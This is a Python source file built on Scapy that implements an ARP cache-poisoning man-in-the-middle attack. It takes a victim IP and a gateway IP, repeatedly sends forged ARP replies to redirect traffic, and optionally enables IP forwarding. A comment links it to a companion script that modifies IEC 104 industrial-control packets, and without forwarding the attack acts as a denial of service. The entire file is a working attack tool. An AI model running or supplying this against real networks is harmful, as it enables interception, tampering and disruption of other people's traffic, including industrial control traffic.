#!/etc/usr/python


from scapy.all import *
import sys
import os
import time





def stop_ip_forward():
	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def start_ip_forward():
	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

#function used
class ARP_poisoning:
	filter_ = "ip"

	INTERFACE = "eno1"
	VICTIM_IP = "192.168.20.11"
	GATEWAY_IP = "192.168.20.10"
	MY_IP = "192.168.20.15"
	FOWARD_IP=False # change this to true if you don't use this with the mitm_modify_packets_IEC_104.py so that you are in a mitm position and not just DOS

	def get_mac(self,IP):
		conf.verb = 0
		ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = self.INTERFACE, inter = 0.1)
		for snd,rcv in ans:
			return rcv.sprintf(r"%Ether.src%")

	def get_var_from_argv(self):
		print( "usage: python "+sys.argv[0]+" INTERFACE victim_ip gateway_ip my_ip")
		if len(sys.argv) ==5:
			self.INTERFACE=sys.argv[1]
			self.VICTIM_IP=sys.argv[2]
			self.GATEWAY_IP=sys.argv[3]
			self.MY_IP=sys.argv[4]
		print( "arguments used: INTERFACE="+self.INTERFACE+" VICTIM_IP="+self.VICTIM_IP+" GATEWAY_IP="+self.GATEWAY_IP+" MY_IP="+self.MY_IP)

	 
	def reARP(self):
	       
		print "\n[*] Restoring Targets..."
		victimMAC = self.get_mac(self.VICTIM_IP)
		gateMAC = self.get_mac(self.GATEWAY_IP)
		send(ARP(op = 2, pdst = self.GATEWAY_IP, psrc = self.VICTIM_IP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
		send(ARP(op = 2, pdst = self.VICTIM_IP, psrc = self.GATEWAY_IP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
		if(self.FOWARD_IP):
			print "[*] Disabling IP Forwarding..."
			stop_ip_forward()
		print "[*] Shutting Down..."
		sys.exit(1)
	 
	def trick(self,gm, vm):
		send(ARP(op = 2, pdst = self.VICTIM_IP, psrc = self.GATEWAY_IP, hwdst= vm))
		send(ARP(op = 2, pdst = self.GATEWAY_IP, psrc = self.VICTIM_IP, hwdst= gm))

	 
	def mitm(self):
		if(self.FOWARD_IP):
			print "\n[*] Enabling IP Forwarding...\n"
			start_ip_forward()
		print "getting MAC of : victim: "+self.VICTIM_IP

		try:
		        victimMAC = self.get_mac(self.VICTIM_IP)
		except Exception:
			if(self.FOWARD_IP):
				stop_ip_forward()
		        print "[!] Couldn't Find Victim MAC Address"
		        print "[!] Exiting..."
		        sys.exit(1)
		print "found MAC of : victim: "+victimMAC
		print "getting MAC of : gateway: "+self.GATEWAY_IP
		try:
		        gateMAC = self.get_mac(self.GATEWAY_IP)
		except Exception:
		        if(self.FOWARD_IP):
				stop_ip_forward()
		        print "[!] Couldn't Find Gateway MAC Address"
		        print "[!] Exiting..."
		        sys.exit(1)
		print "found MAC of : gateway: "+gateMAC
		print "[*] Poisoning Targets..."       
		while 1:
		        try:
		                self.trick(gateMAC, victimMAC)
		                time.sleep(1.5)	
		        except KeyboardInterrupt:
		                self.reARP()
		                break


##ACTUAL main:
if __name__ == '__main__':
	instance=ARP_poisoning()
	instance.get_var_from_argv()
	instance.mitm()



